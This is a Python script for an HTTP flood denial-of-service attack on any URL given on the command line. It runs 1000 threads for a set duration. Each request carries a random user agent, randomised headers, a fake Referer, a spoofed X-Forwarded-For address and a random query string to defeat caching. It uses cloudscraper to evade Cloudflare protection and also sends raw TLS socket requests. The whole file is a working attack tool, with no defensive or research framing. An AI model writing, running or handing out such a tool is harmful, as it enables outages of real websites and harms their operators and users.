import threading
import random
import string
import time
import socket
import ssl
import certifi
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
import pyhttpx
import cloudscraper

class AtomicCounter:
    def __init__(self):
        self.value = 0
        self._lock = threading.Lock()

    def increment(self, amount=1):
        with self._lock:
            self.value += amount

class HttpFlood:
    def __init__(self, url, duration, threads=1000):
        self.url = url
        self.duration = duration
        self.threads = threads
        self.counter = AtomicCounter()
        self.failed = AtomicCounter()
        self.ua = UserAgent()
        self.scraper = cloudscraper.create_scraper()
        self.session = pyhttpx.HttpSession()
        self.stop_event = threading.Event()
        self.proxies = None
        self.sockets = []

    def generate_random_string(self, length=10):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def get_random_user_agent(self):
        return self.ua.random

    def build_random_headers(self):
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'pt-BR,pt;q=0.8,en-US;q=0.7,en;q=0.6']),
            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
            'Connection': 'keep-alive',
            'DNT': str(random.randint(0, 1)),
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.get_random_user_agent(),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
            'Sec-Fetch-User': '?1',
            'Pragma': random.choice(['no-cache', ''])
        }

        if random.random() > 0.5:
            headers['Referer'] = f'https://www.{random.choice(["google", "bing"])}.com/{self.generate_random_string(random.randint(5, 10))}'

        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'

        return headers

    def create_ssl_context(self):
        context = ssl.create_default_context(cafile=certifi.where())
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        context.options |= ssl.OP_NO_TLSv1
        context.options |= ssl.OP_NO_TLSv1_1
        context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
        return context

    def create_socket(self):
        parsed = urllib.parse.urlparse(self.url)
        host = parsed.netloc
        port = 443 if parsed.scheme == 'https' else 80

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        if parsed.scheme == 'https':
            context = self.create_ssl_context()
            sock = context.wrap_socket(sock, server_hostname=host)

        sock.connect((host, port))
        return sock

    def make_raw_request(self, sock):
        try:
            path = urllib.parse.urlparse(self.url).path or '/'
            query = f'{self.generate_random_string(5)}={self.generate_random_string(3)}'
            headers = self.build_random_headers()
            
            request = f"GET {path}?{query} HTTP/1.1\r\n"
            request += f"Host: {urllib.parse.urlparse(self.url).netloc}\r\n"
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"
            request += "\r\n"
            
            sock.sendall(request.encode())
            response = sock.recv(4096)
            return True
        except:
            return False

    def make_request(self):
        try:
            headers = self.build_random_headers()
            params = {self.generate_random_string(5): self.generate_random_string(3)}
            
            if random.random() > 0.7:
                with self.scraper.get(self.url, params=params, headers=headers, timeout=5) as response:
                    return response.status_code == 200
            else:
                response = self.session.get(self.url, params=params, headers=headers, timeout=5)
                return response.status_code == 200
        except:
            return False

    def worker(self):
        if random.random() > 0.8:
            sock = self.create_socket()
            self.sockets.append(sock)
            
            while not self.stop_event.is_set():
                if not self.make_raw_request(sock):
                    self.failed.increment()
                self.counter.increment()
        else:
            while not self.stop_event.is_set():
                if not self.make_request():
                    self.failed.increment()
                self.counter.increment()

    def run(self):
        timer = threading.Timer(self.duration, self.stop_event.set)
        timer.start()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.worker)
        
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass

        return {'total': self.counter.value, 'failed': self.failed.value}

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        sys.exit()

    url = sys.argv[1]
    duration = int(sys.argv[2])
    
    flood = HttpFlood(url, duration, threads=1000)
    stats = flood.run()
    
    print(f"Requests: {stats['total']}")
    print(f"Failed: {stats['failed']}")
